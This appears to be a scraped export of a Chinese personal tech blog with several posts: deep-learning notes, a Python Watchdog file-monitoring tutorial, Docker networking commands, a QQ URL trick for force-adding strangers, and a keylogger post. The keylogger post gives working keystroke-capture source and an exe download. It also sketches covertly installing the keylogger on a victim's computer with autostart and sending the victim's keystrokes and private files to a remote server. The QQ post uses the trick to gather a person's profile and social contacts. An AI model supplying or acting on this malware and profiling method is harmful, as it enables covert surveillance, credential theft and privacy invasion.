3、从数据中学习表示&emsp;&emsp;为了给出深度学习的定义并搞清楚深度学习与其他机器学习方法的区别，我们首先需要知道机器学习算法在做什么。前面说过，给定包含预期结果的示例，机器学习将会发现执行一项数据处理任务的规则。因此，我们需要以下三个要素来进行机器学习。 输入数据点。例如，你的任务是语音识别，那么这些数据点可能是记录人们说话的声音文件。如果你的任务是为图像添加标签，那么这些数据点可能是图像。 预期输出的示例。对于语音识别任务来说，这些示例可能是人们根据声音文件整理生成的文本。对于图像标记任务来说，预期输出可能是“狗”“猫”之类的标签。 衡量算法效果好坏的方法。这一衡量方法是为了计算算法的当前输出与预期输出的差距。衡量结果是一种反馈信号，用于调节算法的工作方式。这个调节步骤就是我们所说的学习。 &emsp;&emsp;机器学习模型将输入数据变换为有意义的输出，这是一个从已知的输入和输出示例中进行“学习”的过程。因此，机器学习和深度学习的核心问题在于有意义地变换数据，换句话说，在于学习输入数据的有用表示（representation）——这种表示可以让数据更接近预期输出。在进一步讨论之前，我们需要先回答一个问题：什么是表示？这一概念的核心在于以一种不同的方式来查看数据（即表征数据或将数据编码）。例如，彩色图像可以编码为RGB（红-绿-蓝）格式或HSV（色相-饱和度-明度）格式，这是对相同数据的两种不同表示。在处理某些任务时，使用某种表示可能会很困难，但换用另一种表示就会变得很简单。举个例子，对于“选择图像中所有红色像素”这个任务，使用RGB格式会更简单，而对于“降低图像饱和度”这个任务，使用HSV格式则更简单。机器学习模型都是为输入数据寻找合适的表示——对数据进行变换，使其更适合手头的任务（比如分类任务）。 &emsp;&emsp;我们来具体说明这一点。考虑x轴、y轴和在这个(x, y)坐标系中由坐标表示的一些点，如图所示。 可以看到，图中有一些白点和一些黑点。假设我们想要开发一个算法，输入一个点的坐标(x, y)，就能够判断这个点是黑色还是白色。在这个例子中： 输入是点的坐标； 预期输出是点的颜色； 衡量算法效果好坏的一种方法是，正确分类的点所占的百分比。 这里我们需要的是一种新的数据表示，可以明确区分白点与黑点。可用的方法有很多，这里用的是坐标变换，如图所示。 &emsp;&emsp;在这个新的坐标系中，点的坐标可以看作数据的一种新的表示。这种表示很棒！利用这种新的表示，用一条简单的规则就可以描述黑/白分类问题：“x&gt;0的是黑点”或“x&lt;0的是白点”。这种新的表示基本上解决了该分类问题。 &emsp;&emsp;在这个例子中，我们人为定义了坐标变换。但是，如果我们尝试系统性地搜索各种可能的坐标变换，并用正确分类的点所占百分比作为反馈信号，那么我们做的就是机器学习。机器学习中的学习指的是，寻找更好数据表示的自动搜索过程。 &emsp;&emsp;所有机器学习算法都包括自动寻找这样一种变换：这种变换可以根据任务将数据转化为更加有用的表示。这些操作可能是前面提到的坐标变换，也可能是线性投影（可能会破坏信息）、平移、非线性操作（比如“选择所有x&gt;0的点”），等等。机器学习算法在寻找这些变换时通常没有什么创造性，而仅仅是遍历一组预先定义好的操作，这组操作叫作假设空间（hypothesis space）。 &emsp;&emsp;这就是机器学习的技术定义：在预先定义好的可能性空间中，利用反馈信号的指引来寻找输入数据的有用表示。这个简单的想法可以解决相当多的智能任务，从语音识别到自动驾驶都能解决。现在你理解了学习的含义，下面我们来看一下深度学习的特殊之处。 4、深度学习之“深度”&emsp;&emsp;深度学习是机器学习的一个分支领域：它是从数据中学习表示的一种新方法，强调从连续的层（layer）中进行学习，这些层对应于越来越有意义的表示。“深度学习”中的“深度”指的并不是利用这种方法所获取的更深层次的理解，而是指一系列连续的表示层。数据模型中包含多少层，这被称为模型的深度（depth）。这一领域的其他名称包括分层表示学习（layered representationslearning）和层级表示学习（hierarchicalrepresentations learning）。现代深度学习通常包含数十个甚至上百个连续的表示层，这些表示层全都是从训练数据中自动学习的。与此相反，其他机器学习方法的重点往往是仅仅学习一两层的数据表示，因此有时也被称为浅层学习（shallowlearning）。 &emsp;&emsp;在深度学习中，这些分层表示几乎总是通过叫作神经网络（neural network）的模型来学习得到的。神经网络的结构是逐层堆叠。神经网络这一术语来自于神经生物学，然而，虽然深度学习的一些核心概念是从人们对大脑的理解中汲取部分灵感而形成的，但深度学习模型不是大脑模型。没有证据表明大脑的学习机制与现代深度学习模型所使用的相同。你可能会读到一些流行科学的文章，宣称深度学习的工作原理与大脑相似或者是根据大脑的工作原理进行建模的，但事实并非如此。对于这一领域的新人来说，如果认为深度学习与神经生物学存在任何关系，那将使人困惑，只会起到反作用。你无须那种“就像我们的头脑一样”的神秘包装，最好也忘掉读过的深度学习与生物学之间的假想联系。就我们的目的而言，深度学习是从数据中学习表示的一种数学框架。 &emsp;&emsp;深度学习算法学到的表示是什么样的？我们来看一个多层网络（见图）如何对数字图像进行变换，以便识别图像中所包含的数字。 &emsp;&emsp;如下图所示，这个网络将数字图像转换成与原始图像差别越来越大的表示，而其中关于最终结果的信息却越来越丰富。你可以将深度网络看作多级信息蒸馏操作：信息穿过连续的过滤器，其纯度越来越高（即对任务的帮助越来越大）。 5、用三张图理解深度学习的工作原理&emsp;&emsp;现在你已经知道，机器学习是将输入（比如图像）映射到目标（比如标签“猫”），这一过程是通过观察许多输入和目标的示例来完成的。你还知道，深度神经网络通过一系列简单的数据变换（层）来实现这种输入到目标的映射，而这些数据变换都是通过观察示例学习到的。下面来具体看一下这种学习过程是如何发生的。 &emsp;&emsp;神经网络中每层对输入数据所做的具体操作保存在该层的权重（weight）中，其本质是一串数字。用术语来说，每层实现的变换由其权重来参数化（parameterize，见下图）。权重有时也被称为该层的参数（parameter）。在这种语境下，学习的意思是为神经网络的所有层找到一组权重值，使得该网络能够将每个示例输入与其目标正确地一一对应。但重点来了：一个深度神经网络可能包含数千万个参数。找到所有参数的正确取值可能是一项非常艰巨的任务，特别是考虑到修改某个参数值将会影响其他所有参数的行为。 &emsp;&emsp;想要控制一件事物，首先需要能够观察它。想要控制神经网络的输出，就需要能够衡量该输出与预期值之间的距离。这是神经网络损失函数（lossfunction）的任务，该函数也叫目标函数（objective function）。损失函数的输入是网络预测值与真实目标值（即你希望网络输出的结果），然后计算一个距离值，衡量该网络在这个示例上的效果好坏（见图）。 &emsp;&emsp;深度学习的基本技巧是利用这个距离值作为反馈信号来对权重值进行微调，以降低当前示例对应的损失值（见下图）。这种调节由优化器（optimizer）来完成，它实现了所谓的反向传播（backpropagation）算法，这是深度学习的核心算法。下一章中会详细地解释反向传播的工作原理。 &emsp;&emsp;一开始对神经网络的权重随机赋值，因此网络只是实现了一系列随机变换。其输出结果自然也和理想值相去甚远，相应地，损失值也很高。但随着网络处理的示例越来越多，权重值也在向正确的方向逐步微调，损失值也逐渐降低。这就是训练循环（training loop），将这种循环重复足够多的次数（通常对数千个示例进行数十次迭代），得到的权重值可以使损失函数最小。具有最小损失的网络，其输出值与目标值尽可能地接近，这就是训练好的网络。再次强调，这是一个简单的机制，一旦具有足够大的规模，将会产生魔法般的效果。","categories":[{"name":"深度学习","slug":"深度学习","permalink":"https://wolke.cn/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"https://wolke.cn/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"author":"w01ke"},{"title":"使用Watchdog监控文件","slug":"使用Watchdog监控文件","date":"2022-01-14T06:26:42.000Z","updated":"2022-01-14T07:02:45.880Z","comments":true,"path":"post/8501a278.html","link":"","permalink":"https://wolke.cn/post/8501a278.html","excerpt":"","text":"好久没有更新了，最近刚到家，调整了下状态继续学习更新 一、简介Watchdog是一款用于监控文件系统事件的Python库，对不同平台的事件进行了封装。 Watchdog优先使用底层原生API，其次再通过轮询磁盘实现监控，目前支持以下操作系统 Windows：ReadDirectoryChangesW Linux 2.6+：inotify Mac OS X：kqueue 或 FSEvents BSD Unix variants：kqueue 仅支持Python 3.5+ 二、安装WatchDogpip install watchdog 三、初试import timefrom watchdog.observers import Observerfrom watchdog.events import FileSystemEventHandlerclass MyHandler(FileSystemEventHandler): def on_any_event(self, event): print(event.event_type, event.src_path)event_handler = MyHandler()observer = Observer()observer.schedule(event_handler, path=&#x27;.&#x27;, recursive=False)observer.start()try: while True: time.sleep(0.1)except KeyboardInterrupt: observer.stop()observer.join() 效果： created .\\a.txtmodified .\\a.txt~modified .\\a.txtmoved .\\a.txtdeleted .\\b.txt 退出：Ctrl + C 四、重定向到日志中输出重定向到logging日志中 import sysimport timeimport loggingfrom watchdog.observers import Observerfrom watchdog.events import LoggingEventHandlerlogging.basicConfig(level=logging.INFO, format=&#x27;%(asctime)s - %(message)s&#x27;, datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;)path = sys.argv[1] if len(sys.argv) &gt; 1 else r&#x27;D:\\监控文件夹&#x27;event_handler = LoggingEventHandler()observer = Observer()observer.schedule(event_handler, path, recursive=True)observer.start()try: while True: time.sleep(0.1)finally: observer.stop() observer.join() 五、Handler类型 类型 功能 FileSystemEventHandler 文件 PatternMatchingEventHandle 模式匹配文件 RegexMatchingEventHandler 正则匹配文件 LoggingEventHandler 记录日志 六 、WatchDog相关介绍1、Observer可以通过以下命令导入 from watchdog.observers import Observer 这个模块的作用主要是当作启动和关闭监控程序的，给予文件夹路径后，Observer会监控文件夹的变化并且反馈变化。 2、events可以通过以下命令导入 from watchdog.events import * &emsp;&emsp;这是watchdog的动作模块，具体作用是根据Observer模块反馈的事件分配不一样的操作动作方法，然后程序再继承这个方法开始执行所需的代码。有的萌新会问，为什么Observer反馈了事件还需要events去接收处理，还得再去继承events多麻烦。具体为啥我也不知道，只是官方把Observer事件反馈的结果传给events，events进行分配的。觉得麻烦的大哥可以自己写模块接受Observer结果并处理，萌新的我选择直接继承官方events实列，反正效果差不多。 七、自定义操作动作from watchdog.observers import Observerfrom watchdog.events import *a = r&quot;D:\\监控文件夹&quot;class MyHandler(FileSystemEventHandler): def on_modified(self, event): print(&quot;文件被修改了 %s &quot; % event.src_path) def on_created(self, event): print(&quot;文件被创建了 %s&quot; % event.src_path)if __name__ == &quot;__main__&quot;: path = a event_handler = MyHandler() observer = Observer() observer.schedule(event_handler, path, recursive=True) observer.start() try: while True: time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() 在监控目录下进行新建文件夹和删除文件夹操作结果： 有没有仔细看我对events模块导入的是 所有的类？实际上使用的主要是： FileSystemEventHandler这个类 点开events模块： 类有很多个，简单用不到其他类的可以只导入这一个就行了 ，这个类官方是咋写的呢？看下图： &emsp;&emsp;你会发现除了 dispatch 下面有内容，这个类的其他方法都是空的 &emsp;&emsp;这里dispatch决定了接收到Observer动作后转发给哪个方法操作，而on_any_event 呢会首先被dispatch调用，之后才会分配给其他的方法。这里的所有方法都是空的，目的就是让我们自行继承这个类然后执行我们自己的代码。由于已经把动作分配好了，比如我新建文件夹，只会调用create，或者移动文件夹只会调用move，所以根据相关动作继承该方法后在方法里面写需要执行的代码即可实现监控和监控操作。 八、课程设计相关&emsp;&emsp;前几天网络安全课程设计，有个选题就是关于文件监控相关的，在这里我把我的课程设计报告贴出来 1、课程设计目的&emsp;&emsp;本课程设计要求学生在已有理论学习的基础上，全面梳理所学的计算机网络、网络安全、程序设计等相关知识，进一步深入理解网络安全的内容；了解常见的网络安全工具、资源和相关技术，掌握网络安全应用系统分析、设计、实现和测试的方法。 2、系统需求分析（1）提高安全性。随着计算机技术的发展和计算机的广泛应用，对计算机的安全的要求也越来越高。一个主要的问题是保证磁盘中的数据的安全，并能实时地发现其中的异常运行状况，从而及时地进行系统的改进和维护，这需要实时的监控计算机在进行文件操作的时候产生的各种信息和数据。文件系统的监控是保护磁盘数据安全的一种强大的方式，通过在文件系统之上增加一层文件监控系统，为系统安全提供了日志信息以供分析，有着重要的理论和实践意义. （2）记录行为轨迹。记录机器使用者的文件操作，分析使用者的行为轨迹和逻辑。 （3）行为分析。当需要对一个恶意程序进行代码分析时，可以尝试在沙箱运行恶意代码，从捕捉到恶意代码运行时的文件操作来逆向推出恶意代码的逻辑，以制作出补丁反制。 （4）快速响应。服务器的后台程序通常在机器没有问题的情况下，需要长期运行（比如说数个月，甚至是数年）。但是，程序的配置文件有时候是需要定期作调整。为了不影响程序对外服务（不重启），动态加载配置文件是一种非常常见的需求。通过监控某个文件的创建、删除和修改等事件，可以很方便做出对应的动作（比如说reload）。 3、代码Github项目地址：https://github.com/w01ke/File-monitoring import sysimport timefrom watchdog.observers import Observerfrom watchdog.events import *import openpyxlimport osclass MyHandler(FileSystemEventHandler): def __init__(self): self.time = 1 self.file = 2 self.action = 3 self.rows = 2 self.num = 0; def on_modified(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;修改&quot; modified_log = action_time + &#x27; &#x27; + action + event.src_path print(modified_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename) def on_created(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;创建&quot; created_log = action_time + &#x27; &#x27; + action + event.src_path print(created_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename) def on_moved(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;移动&quot; moved_log = action_time + &#x27; &#x27; + action + event.src_path print(moved_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename) def on_deleted(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;删除&quot; deleted_log = action_time + &#x27; &#x27; + action + event.src_path print(deleted_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename)def mkdir(path): folder = os.path.exists(path) if not folder: # 判断是否存在文件夹如果不存在则创建为文件夹 os.makedirs(path) # makedirs 创建文件时如果路径不存在会创建这个路径 else: passif __name__ == &quot;__main__&quot;: print(r&quot;&quot;&quot; [+] Please enter your Destination of monitoring path after the monitor.py [+] Example: python monitor.py D:\\test [+] Default monitoring path is current path if you don&#x27;t enter any path [+] The logs will be saved in D:\\Monitoring record &quot;&quot;&quot;) des_file = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;.&quot; # 创建目录 path = r&quot;D:\\Monitoring record&quot; mkdir(path) wb = openpyxl.Workbook() # 新建一个excel文件，并且在单元表为&quot;sheet1&quot;的表中写入数据 ws = wb.create_sheet(&quot;sheet1&quot;) # 调整列宽 ws.column_dimensions[&#x27;A&#x27;].width = 20.0 ws.column_dimensions[&#x27;B&#x27;].width = 10.0 ws.column_dimensions[&#x27;C&#x27;].width = 80.0 # 在单元格中写入数据 ws.cell(row=1, column=1).value = &quot;时间&quot; ws.cell(row=1, column=2).value = &quot;行为&quot; ws.cell(row=1, column=3).value = &quot;文件路径&quot; # 日志文件名 filename = path + &quot;\\\\\\\\&quot; + time.strftime(&quot;%Y-%m-%d %H-%M-%S&quot;, time.localtime()) + &quot;.xlsx&quot; event_handler = MyHandler() observer = Observer() observer.schedule(event_handler, path=des_file, recursive=True) observer.start() try: while True: time.sleep(0.1) except KeyboardInterrupt: observer.stop() observer.join() 4、系统实现结果&emsp;&emsp;如果要监控“D:\\监控文件夹”下的内容，运行monitor.py，命令：python monitor.py D:\\监控文件夹 &emsp;&emsp;此时程序就在后台监控目标路径的文件了，在监控文件夹的创建，修改，删除等操作等会显示在终端中 &emsp;&emsp;而操作的记录也会保存到D:\\Monitoring record的文件夹的excel表格的sheet1表中 5、总结（1）问题及解决方案问题1：每次启动程序后，操作记录写入excel中，都会覆盖写入，而不是追加写入，因此旧的操作记录将会消失 解决1：每次重新启动程序，获取当前时间，并将程序启动时刻作为文件名来命名excel表，因此每次重新启动程序都会有一张新的excel表而不会覆盖写旧表。 （2）收获通过自己动手，又学会了一项新技能，拓展了知识面，锻炼了代码编写能力 （3）优缺点优点：①可以让用户自主选择监控文件夹 ②有良好的使用提示（运行程序时显示的4条Tips）③重写了events的函数和类 缺点：①相对于目前其他程序实现的功能基本比较完善，但是有些功能点还没有实现，例如监控键盘的操作记录，这个可以使用python的pynput模块来完成，具体可以参考之前的博客https://wolke.cn/post/90a9d002.html ，这样结合起来不仅可以监控操作了什么文件，更可以监控修改了什么内容。","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"}],"author":"w01ke"},{"title":"强制加好友并给他打QQ电话","slug":"强制加好友并给他打QQ电话","date":"2022-01-04T10:09:48.000Z","updated":"2022-01-04T10:20:20.159Z","comments":true,"path":"post/bce31dbc.html","link":"","permalink":"https://wolke.cn/post/bce31dbc.html","excerpt":"","text":"一、相关说明&emsp;&emsp;21年5月份传出的代码，目前来源不清楚，好像是一位博主朋友抓的，在这里感谢他。 &emsp;&emsp;这个功能可以直接跳转到这个页面，然后你只需要把他调整一下分组，再去搜索好友里面直接搜索就好，当然，肯定不会让对方好友列表显示你，但是可以让自己看见，不能发消息，不过你可以打电话，对方能不能收到就不一定了。 二、相关代码https://ti.qq.com/friends/recall?uin=输入QQ号 三、示例&emsp;&emsp;之前一朋友被网络诈骗了，托我追查一下此诈骗犯，朋友也把相关信息和证据提交给了警方。这里就以这个诈骗犯“苏”的为例，来看看面对诈骗犯我们可以进行什么操作。 1、准备&emsp;&emsp;首先我这个QQ并没有苏的好友 2、强制“添加”好友&emsp;&emsp;生成链接 &emsp;&emsp;点击该链接，会跳到这个页面，注意！此时分组是默认的，必须要修改到另外一个分组，我的好友列表才能看到苏 &emsp;&emsp;移动到另一分组 &emsp;&emsp;此时查看好友列表就能发现苏 3、消息与电话测试&emsp;&emsp;从测试来看，消息发送不成功，电话一直无人接听（后面自己给自己又进行了一轮测试，发现接不到来电电话的） 4、其他测试后面进行了一系列测试： （1）失败点： 聊天框左划尝试看QQ空间，和直接从个人资料卡访问QQ空间，显示非好友无法访问 尝试登录王者荣耀，来获取QQ好友关系，查看苏的王者战区定位即可大致知晓苏的活动范围，但是拉取好友状态失败 尝试查看个人签名也失败 （3）成功点 成功查看个人详细资料，可以获得更多的个人信息 随心贴可以看到了。成为好友前我们是看不到随心贴的，现在能看到苏发了什么随心贴，谁赞了，评论了。我们可能通过谁评论和赞，收集到苏的小号或亲友、同学等社交关系，并从这些人的QQ开始分析寻找突破口，分析苏的社交圈以及更多信息。 举例：这里以点击第一个随心贴的详细页面 发现一个与苏及其相似的网名，可能是小号或者是闺蜜，因此点击，就可以查看到这人的QQ资料卡，后续就从其他人的QQ下手收集更多关于苏的信息。 四、总结&emsp;&emsp;此代码漏洞利用的影响点其实就是QQ个人主页这一块，实际依然是非好友关系。换句话说，只有QQ个人主页的代码逻辑是有漏洞的，像QQ空间和签名等会有其他代码逻判断是否是好友，而不会受以上payload的影响。 &emsp;&emsp;当然我的测试也不够完整，如果有其他利用姿势的欢迎在评论区补充","categories":[{"name":"社工","slug":"社工","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"QQ技术","slug":"QQ技术","permalink":"https://wolke.cn/tags/QQ%E6%8A%80%E6%9C%AF/"}],"author":"w01ke"},{"title":"想要监控键盘？Python搞定！","slug":"想要监控键盘？Python搞定！","date":"2022-01-01T10:53:34.000Z","updated":"2022-01-03T03:16:39.683Z","comments":true,"path":"post/90a9d002.html","link":"","permalink":"https://wolke.cn/post/90a9d002.html","excerpt":"","text":"如果将电脑暂时给他人用，如何监控别人在我们电脑使用键盘敲了些什么东西呢？ 软件下载地址：https://github.com/w01ke/Keyboard_Record ，下载完成后双击w01ke.exe即可运行 一、环境依赖需要安装pynput模块，可以使用pip安装 pip install pynput 也可以在pycharm的settings&gt;interpreter中安装 二、相关代码from pynput.keyboard import Key, Controller, Listenerimport timekeyboard = Controller()keys = []def on_press(key): str(key).replace(&quot;&#x27;&quot;, &quot;&quot;)def on_release(key): global keys string = str(key).replace(&quot;&#x27;&quot;, &quot;&quot;) keys.append(&#x27;\\r&#x27; + string) print(keys) main_string = &quot;&quot;.join(keys) print(main_string) if len(main_string) &gt; 15: with open(&#x27;D:/w01ke.txt&#x27;, &#x27;a&#x27;) as f: f.write(main_string) keys = []with Listener(on_press=on_press, on_release=on_release) as listener: listener.join() 这里会将键盘记录传入D:/w01ke.txt 三、软件下载与使用 已将程序文件打包exe，软件下载地址：https://github.com/w01ke/Keyboard_Record ，下载完成后双击w01ke.exe即可运行 当双击w01ke.exe后，程序就已经在后台运行，监控用户的键盘输入，并将信息存入D盘中的w01ke.txt文件中。 如果需要退出程序，打开任务管理器，找到w01ke.exe，选中结束任务即可。 四、点评&emsp;&emsp;上面代码其实存在很多的缺陷，如果你是一个黑客的话，你可能可以通过用户使用tab键切换表单来判断输入框的间隔，或者通过其他分析手段，但是这样并不是很智能，我们其实可以尝试通过鼠标点击来截断输出，这样就可以连贯的看到用户输入的词了，快来尝试一下吧！ 五、一些思考 &emsp;&emsp;作为一名黑客，如果不是监控自己的电脑，而是想要监控他人的键盘输入情况，我们可以改进程序代码，将w01ke.exe文件发送给小明，当小明双击运行w01ke.exe后，因为没有可视化界面，因此表面看起来无事发生，但w01ke.exe已经在后台运行，如果没有一些计算机常识，小明也不会检查后台进程发现的。但这样还不够，如果小明重启电脑了，那我们的w01ke.exe就退出了，因此我们需要在程序代码中加入一些自启动的相关代码，让小明开机，w01ke.exe文件就自动在后台运行了，或者引诱小明自己每次打开电脑都运行w01ke.exe。 &emsp;&emsp;但这还不够，小明的记录键盘操作的w01ke.txt如何发送到我们自己的电脑上呢？一是可以直接发送文件给我们具有公网IP的服务器上；二是直接与我们的服务器建立连接，但这可能会报毒；三是我们可以自己做一个网站页面，接收提交文件的表单，w01ke.exe设置好，每隔24h自动访问该网站，并自动在后台将w01ke.txt，甚至小明其他的隐私文件也可以，自动通过网页的形式上传到我们的云服务器上，我们在服务器上即可看到小明的键盘记录以及其他隐私文件，而我之前又刚好写过这方面的程序。 &emsp;&emsp;当然这只是作为一名黑客角度思考的可能实现的攻击方式，后续我也将尝试实现这些功能","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"}],"author":"w01ke"},{"title":"docker网络","slug":"docker网络","date":"2021-12-13T12:14:49.000Z","updated":"2022-01-03T03:26:40.660Z","comments":true,"path":"post/20783356.html","link":"","permalink":"https://wolke.cn/post/20783356.html","excerpt":"","text":"一、理解Docker0&emsp;&emsp;容器运行时如果没有指定网络模式，那么就默认是桥接模式的docker0 1、测试&emsp;&emsp;三个网络： 2、问题&emsp;&emsp;docker是如何处理容器网络访问的？ 创建一个名为tomcat02的容器[root@VM-0-15-centos ~]# docker run -d -P --name tomcat02 tomcata3be14a249d91c1103bb949f9db477f7332dbe3d5545e96c4106a17a10101bca#查看容器的内网IP，发现容器启动的时候会得到一个 eth0@if87 IP地址，这是docker分配的[root@VM-0-15-centos ~]# docker exec -it tomcat02 ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever86: eth0@if87: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:12:00:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.18.0.6/16 brd 172.18.255.255 scope global eth0 valid_lft forever preferred_lft forever#思考。本机能否ping通docker容器内部。答案是能，因为在同一网段[root@VM-0-15-centos ~]# ping 172.18.0.6PING 172.18.0.6 (172.18.0.6) 56(84) bytes of data.64 bytes from 172.18.0.6: icmp_seq=1 ttl=64 time=0.094 ms64 bytes from 172.18.0.6: icmp_seq=2 ttl=64 time=0.055 ms64 bytes from 172.18.0.6: icmp_seq=3 ttl=64 time=0.051 ms64 bytes from 172.18.0.6: icmp_seq=4 ttl=64 time=0.053 ms^C--- 172.18.0.6 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 2999msrtt min/avg/max/mdev = 0.051/0.063/0.094/0.018 ms 3、原理&emsp;&emsp;我们每启动一个docker容器，docker就会给容器分配一个IP，我们只要安装了docker，就会有一个网卡docker0，使用的模式是桥接模式，使用的技术是veth-pair技术 &emsp;&emsp;比如启动tomcat2容器后，再次查看IP，可以发现多了个网卡 &emsp;&emsp;再启动tomcat03容器，查看容器IP和本机IP，发现又多了一对网卡 &emsp;&emsp;我们发现这个容器的网卡都是一对一对的 &emsp;&emsp;evth-pair就是一对一的虚拟接口，它们都是成对出现的，一端连着协议，一端彼此相连。正因为有这个特性，evth-pair充当一座桥梁，连接各种虚拟网络设备。Openstack，Docker容器之间的连接，OVS的连接，都是使用evth-pair技术 &emsp;&emsp;我们来测试一下tomcat02和tomcat03是否可以ping通 # tomcat02 ping tomcat03，能够ping通[root@VM-0-15-centos ~]# docker exec -it tomcat02 ping 172.18.0.7PING 172.18.0.7 (172.18.0.7) 56(84) bytes of data.64 bytes from 172.18.0.7: icmp_seq=1 ttl=64 time=0.115 ms64 bytes from 172.18.0.7: icmp_seq=2 ttl=64 time=0.068 ms64 bytes from 172.18.0.7: icmp_seq=3 ttl=64 time=0.058 ms64 bytes from 172.18.0.7: icmp_seq=4 ttl=64 time=0.065 ms^C--- 172.18.0.7 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 0.058/0.076/0.115/0.024 ms &emsp;&emsp;绘制一张网络模型图 &emsp;&emsp;结论：所有的容器不指定网络的情况下，都是docker0路由的，docker会给我们的容器分配一个默认的可用IP 4、小结 &emsp;&emsp;Docker中所有的网络接口都是虚拟的。虚拟的转法效率高！ &emsp;&emsp;只要容器stop或者删除，那对应网桥对就没了 二、容器互联–link&emsp;&emsp;思考一个场景，我们编写了一个微服务，database url=ip:，项目不重启，数据库IP换掉了，我们希望可以处理这个问题，可以名字来访问容器，那该怎么做？ #尝试直接ping容器名，ping不通 [root@VM-0-15-centos ~]# docker exec -it tomcat02 ping tomcat03ping: tomcat03: Name or service not known#通过--link可以解决#启动tomcat4，并关联tomcat03，tomcat04可以通过直接ping容器名 tomcat03 ping通[root@VM-0-15-centos ~]# docker run -d -P --name tomcat04 --link tomcat03 tomcataa09aa2dbd2425f5e54fa89259069f82523c821ebec865ad452238d7ad8f9fd5[root@VM-0-15-centos ~]# docker exec -it tomcat04 ping tomcat03PING tomcat03 (172.18.0.7) 56(84) bytes of data.64 bytes from tomcat03 (172.18.0.7): icmp_seq=1 ttl=64 time=0.114 ms64 bytes from tomcat03 (172.18.0.7): icmp_seq=2 ttl=64 time=0.065 ms64 bytes from tomcat03 (172.18.0.7): icmp_seq=3 ttl=64 time=0.065 ms64 bytes from tomcat03 (172.18.0.7): icmp_seq=4 ttl=64 time=0.065 ms^C--- tomcat03 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 0.065/0.077/0.114/0.022 ms#但是反向ping，tomcat03无法直接通过ping容器名ping通[root@VM-0-15-centos ~]# docker exec -it tomcat03 ping tomcat04ping: tomcat04: Name or service not known &emsp;&emsp;查看tomcat04的/etc/hosts文件 &emsp;&emsp;查看tomcat03的/etc/hosts文件 &emsp;&emsp;–link就是在hosts配置中增加了一条解析 &emsp;&emsp;不推荐使用–link。docker0问题：它不支持容器名直接访问 三、自定义网络&emsp;&emsp;自定义的网络完善了docker0不支持容器名访问的缺点和–link不能相互ping通的缺点，只要是在同一自定义网络下，都能直接通过容器名相互ping通 &emsp;&emsp;查看所有的docker网络：docker network ls 1、网络模式bridge：桥接（默认，自己创建也使用bridge模式）none：不配置网络host：和宿主机共享网络container：容器网络连通（用的少，局限性大） 2、测试# 我们直接启动的命令 --net bridge，而这个就是我们的docker0docker run -d -P --name tomcat02 tomcat等价于docker run -d -P --name tomcat02 --net bridge tomcat# docker0特点：默认，容器名不能访问，--link可以打通连接#我们可以用create命令自定义一个网络# --driver bridge（默认）# --subnet 192.168.0.0/16（子网掩码）# --gateway 192.168.0.1（网关）[root@VM-0-15-centos ~]# docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynetb93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340# ls命令查看网络，我们自己的网络创建好了[root@VM-0-15-centos ~]# docker network lsNETWORK ID NAME DRIVER SCOPE115a2351052d bridge bridge locala8299a5d2f22 host host localb93f7bc668c4 mynet bridge local #（mynet网络创建成功）431f88da42b1 none null local# inspect命令查看meynet网络信息[root@VM-0-15-centos ~]# docker network inspect mynet[ &#123; &quot;Name&quot;: &quot;mynet&quot;, &quot;Id&quot;: &quot;b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340&quot;, &quot;Created&quot;: &quot;2021-09-06T00:59:48.490085063+08:00&quot;, &quot;Scope&quot;: &quot;local&quot;, &quot;Driver&quot;: &quot;bridge&quot;, &quot;EnableIPv6&quot;: false, &quot;IPAM&quot;: &#123; &quot;Driver&quot;: &quot;default&quot;, &quot;Options&quot;: &#123;&#125;, &quot;Config&quot;: [ &#123; &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;, &quot;Gateway&quot;: &quot;192.168.0.1&quot; &#125; ] &#125;, &quot;Internal&quot;: false, &quot;Attachable&quot;: false, &quot;Ingress&quot;: false, 